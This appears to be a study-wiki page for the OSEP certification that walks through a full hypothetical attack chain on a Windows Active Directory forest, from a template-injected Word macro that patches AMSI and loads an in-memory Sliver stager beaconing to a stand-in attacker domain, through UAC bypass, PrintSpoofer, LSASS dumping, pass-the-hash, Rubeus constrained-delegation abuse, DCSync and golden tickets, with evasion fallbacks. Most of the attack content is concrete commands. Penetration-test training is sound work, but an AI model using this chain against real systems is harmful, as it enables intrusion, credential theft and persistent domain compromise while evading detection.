---
title: OSEP full-chain walkthrough (worked example)
slug: osep-full-chain-walkthrough
aliases: [osep-full-chain, osep-worked-example]
---

{% raw %}

> **TL;DR:** An OSEP-shaped attack: phishing payload defeats AMSI and ASR, lands a stager inside Word, hands off to a .NET loader, beacons via Cloudfront-fronted HTTPS, escalates via SeImpersonate + Print Spooler, pivots to AD, abuses constrained delegation across a forest trust, and ends with cross-forest Domain Admin. Slower and noisier than OSCP — but every step is about *not getting caught*. Pair with [[osep-roadmap]] and [[oscp-vs-osep-mindset]].

## The hypothetical target

| Asset | Role | Defence |
|---|---|---|
| User `j.davis@corp.local` | Marketing | Defender for Endpoint + AppLocker default rules + Office macro blocking with internet exception |
| `WS01` workstation | Win11, MDE | EDR |
| `FILE01` server | Win2022 | EDR + auditd-equivalent telemetry |
| `DC01` `corp.local` | Forest A | trusts `partner.local` |
| `DC02` `partner.local` | Forest B | unconstrained delegation on a service account |

Goal: cross-forest Domain Admin in `partner.local`.

## Stage 0 — infrastructure

- Domain: `update-news.example` (Cloudfront-fronted; see [[domain-fronting-and-cdn-abuse]]).
- Listener: Sliver HTTPS on origin `c2.attacker.example`, exposed only via Cloudfront.
- Pretext: HR phishing (annual review document).

## Stage 1 — initial access (Office macro)

Document: `2026-annual-review.docx`. The `.docx` is clean; uses template injection to fetch `normal.dotm` from `https://update-news.example/templates/normal.dotm`.

`normal.dotm` carries a VBA macro that:
1. Patches AMSI in the host WINWORD.exe process — see [[amsi-bypass]].
2. Builds a .NET assembly in memory using `System.Reflection.Emit` via VBA → COM (DotNetToJScript pattern).
3. Loads a Sliver stager DLL that beacons HTTPS to `update-news.example` every 60s with 0.4 jitter.

```vba
Sub AutoOpen()
    PatchAmsi          ' xor eax,eax; ret on AmsiScanBuffer
    LoadAssembly       ' COM-bridge into .NET CLR, invoke Stager.Entry()
End Sub
```

Why this works against the lab defences:
- `.docx` carrier passes mail filters.
- Template injection fetches the macro at open time — sandboxes that detonate the attachment up-front don't see it.
- AMSI patch performed *before* any noisy string operations.
- Stager assembly is in memory only — no PE on disk, no AppLocker rule to trigger.

## Stage 2 — situational awareness (assumed-breach mindset)

```text
beacon> exec_local id
> j.davis | WS01 | corp\j.davis
> Processes: WINWORD.exe child of explorer.exe; siblings include OneDrive.exe; no debuggers attached
> Sensors: SenseService.exe (MDE), MsMpEng.exe (Defender AV)
```

Posture decisions:
- Don't spawn `powershell.exe` from `WINWORD.exe` — too obvious.
- Use the existing CLR runtime for any code we run.
- Inject sideways into a long-lived legit process (e.g. `RuntimeBroker.exe`).

```text
beacon> migrate --pid 5832    # RuntimeBroker
```

## Stage 3 — local privesc

j.davis is a standard user. Enumerate:
- `whoami /priv` — has `SeImpersonatePrivilege`? No (standard user).
- Services with weak permissions? No.
- Cleartext creds in clipboard/history? No.

UAC misconfigured? `fodhelper` UAC bypass works if AlwaysNotify isn't on:
```text
beacon> execute-assembly fodhelper-bypass.exe "cmd /c whoami /priv"
```

After the bypass we have a high-integrity token in our process. Still not admin, but we can install our own service or scheduled task.

For local SYSTEM, we coerce the Print Spooler if the host still has it enabled (it does):
```text
beacon> execute-assembly PrintSpoofer.exe -i -c "cmd"
# whoami → nt authority\system
```

## Stage 4 — credential harvest on WS01

LSASS protected by PPL. Two options:
- Direct: load a vulnerable driver to disable PPL flag on lsass.exe. Loud — EDR flags BYOVD.
- Indirect: use `nanodump` to grab a clone of LSASS with a different access path; copy off; mimikatz offline.

```text
beacon> execute-assembly Nanodump.exe -w l.dmp
beacon> download l.dmp
# offline:
pypykatz lsa minidump l.dmp
# → corp\admins\helpdesk : DPAPI master key recoverable
```

We get NetNTLMv2 hashes for several users including `helpdesk` who has admin on a fileshare.

## Stage 5 — lateral to FILE01

Pass-the-hash with helpdesk's NTLM:

```text
beacon> exec_remote --target FILE01 --user helpdesk --hash <NT> --tool wmiexec
```

We avoid PsExec (signature heavy in MDE). WMI-exec lands a fresh beacon on FILE01.

## Stage 6 — AD enumeration without BloodHound noise

BloodHound collection is loud (LDAP + SMB-spray). We sample selectively with `SharpHound --CollectionMethods Session,LoggedOn` only on hours-of-day where the user normally logs in. Or, even quieter: pull the LDAP data via Sliver's `ldap` extension and run an offline BloodHound analysis.

Findings:
- `svc_appcache` is in the `Server Operators` group in `corp.local` (RID-cycle confirms).
- `svc_appcache` has `TrustedToAuthForDelegation` (constrained delegation with protocol transition) to several SPNs on a server in `partner.local`.
- The trust `corp.local → partner.local` is **bidirectional and transitive** (TGT-issuing trust).

This is the classic OSEP "constrained delegation across a forest trust" path.

## Stage 7 — get svc_appcache's TGT

`svc_appcache` is in our SQL-derived hash set (from earlier). With its hash we forge a TGT (S4U2Self → S4U2Proxy) to impersonate `Administrator@partner.local`:

```text
# Rubeus on FILE01
beacon> execute-assembly Rubeus.exe asktgt /user:svc_appcache /rc4:<HASH> /nowrap
beacon> execute-assembly Rubeus.exe s4u /user:svc_appcache /rc4:<HASH> \
        /impersonateuser:Administrator /msdsspn:cifs/srv01.partner.local /ptt
```

We now hold a Kerberos ticket usable as `Administrator` on `srv01.partner.local`.

## Stage 8 — cross-forest landing

```text
beacon> exec_remote --target srv01.partner.local --auth kerberos --tool wmiexec
```

On `srv01.partner.local` we are local admin. Dump LSASS (same Nanodump path). Find a logon for `partner\admins\enterprise-admin` (a recent maintenance session).

## Stage 9 — dump the partner KRBTGT (optional, for golden persistence)

DCSync from `partner.local` with the enterprise-admin hash:
```text
beacon> execute-assembly SharpKatz.exe --Command dcsync --Domain partner.local --User krbtgt --DomainController DC02
# → krbtgt NT hash partner.local
```

Persistence: forge a golden ticket for `partner.local` with `krbtgt` hash. Even after the operator rotates other passwords, the golden survives until `krbtgt` rotates twice.

## OPSEC review (what we did right)

- No `powershell.exe` spawned anywhere in the chain.
- Every loader was .NET in-process or `execute-assembly` from beacon memory.
- No drop of Mimikatz; used Nanodump + offline analysis.
- BloodHound collection was deferred and sampled.
- All C2 over HTTPS via Cloudfront-fronted high-rep domain; jitter on beacon.
- No SMB write to ADMIN$ for PsExec; used WMI-exec.

## What this chain doesn't show
- AV evasion engineering — assumed working tooling.
- Defender for Identity detections (sensitive group membership changes, abnormal Kerberos ticket flags).
- Long-haul C2 dwell — real engagements would beacon at 12-hour intervals over weeks.

## Pivots if a stage fails

| If… | …then |
|---|---|
| Macros are blocked | container-file delivery (ISO with `.lnk` running `regsvr32 /i scrobj`) |
| Template injection blocked at egress | embed the macro directly + AMSI patch |
| Defender flags fodhelper | `silentcleanup` scheduled task UAC bypass |
| Print Spooler disabled | UsoSvc / WpnUserService weak permissions; or BYOVD if explicitly authorised |
| LSASS protected & nanodump caught | dump DPAPI master keys from disk + offline decryption |
| Constrained delegation not exploitable | RBCD ([[resource-based-constrained-delegation]]) via machine account quota |
| Forest trust filters SID history | child-to-forest-root via krbtgt of the child ([[child-to-forest-root]]) |

## Total elapsed time
A real OSEP exam runs 48h hacking + 24h report. This chain in lab took ~20h. Most of the time is reconnaissance and evading-detection patience, not exploitation.

## References
- [SpecterOps blog](https://posts.specterops.io/)
- [Dirk-jan Mollema — AD security research](https://dirkjanm.io/)
- [harmj0y — delegation series](https://blog.harmj0y.net/)
- [BC Security — Empire/Sliver tradecraft](https://bc-security.org/)
- See also: [[osep-roadmap]], [[oscp-vs-osep-mindset]], [[constrained-delegation]], [[resource-based-constrained-delegation]], [[cross-forest-trust-abuse]], [[golden-tickets]]

{% endraw %}
